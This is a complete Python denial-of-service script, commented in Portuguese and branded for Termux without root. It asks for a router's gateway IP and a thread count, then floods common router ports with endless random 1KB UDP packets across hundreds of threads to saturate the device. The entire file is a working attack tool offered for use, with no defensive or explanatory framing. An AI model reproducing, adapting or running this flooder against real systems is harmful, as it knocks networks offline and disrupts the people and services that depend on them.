import socket
import threading
import random
import os
import time
import sys
from colorama import Fore, init

init(autoreset=True)

# Portas que costumam causar mais processamento no kernel do roteador
portas_alvo = [80, 443, 53, 1900, 5000, 8080]

def show_banner():
    os.system('clear')
    print(f"""
{Fore.GREEN}    ██████╗ ███████╗██████╗ ███████╗███████╗ ██████╗
{Fore.GREEN}    ██╔══██╗██╔════╝██╔══██╗██╔════╝██╔════╝██╔════╝
{Fore.WHITE}    ██║  ██║█████╗  ██║  ██║███████╗█████╗  ██║     
{Fore.WHITE}    ██║  ██║██╔══╝  ██║  ██║╚════██║██╔══╝  ██║     
{Fore.GREEN}    ██████╔╝███████╗██████╔╝███████║███████╗╚██████╗
{Fore.RED}             [ TERMUX NO-ROOT AGGRESSIVE ]
{Fore.YELLOW}    --------------------------------------------------
    """)

def generate_extreme_payload():
    """ Gera 1KB de dados aleatórios para inundar o processador do alvo """
    return random.getrandbits(8192).to_bytes(1024, 'big')

def attack_no_root(target_ip, port):
    """ Estratégia de UDP Flood: Força o hardware a processar lixo binário """
    # No-Root permite UDP sem restrições de Kernel
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = generate_extreme_payload()
    
    while True:
        try:
            # Envia para portas aleatórias da lista para causar confusão no NAT
            p = random.choice(portas_alvo) if port == 0 else port
            sock.sendto(payload, (target_ip, p))
        except:
            pass

if __name__ == "__main__":
    show_banner()
    
    ip = input(f"{Fore.CYAN}[?] IP do Gateway (Roteador): ")
    threads = int(input(f"{Fore.CYAN}[?] Threads (Para Termux sugere-se 500-800): "))
    
    print(f"\n{Fore.RED}[!] DISPARANDO VETOR UDP AGGRESSIVE...")
    print(f"{Fore.YELLOW}[*] Ignorando restrições de Root via User Datagram Protocol.")

    # Disparando as threads
    for i in range(threads):
        # O socket é criado dentro ou fora dependendo da eficiência da thread
        t = threading.Thread(target=attack_no_root, args=(ip, 0))
        t.daemon = True
        t.start()

    try:
        while True:
            for char in ".o0O0o.":
                sys.stdout.write(f"\r{Fore.RED}[{char}] Status: Saturação em andamento...")
                sys.stdout.flush()
                time.sleep(0.1)
    except KeyboardInterrupt:
        print(f"\n\n{Fore.GREEN}[+] Ataque finalizado pelo usuário.")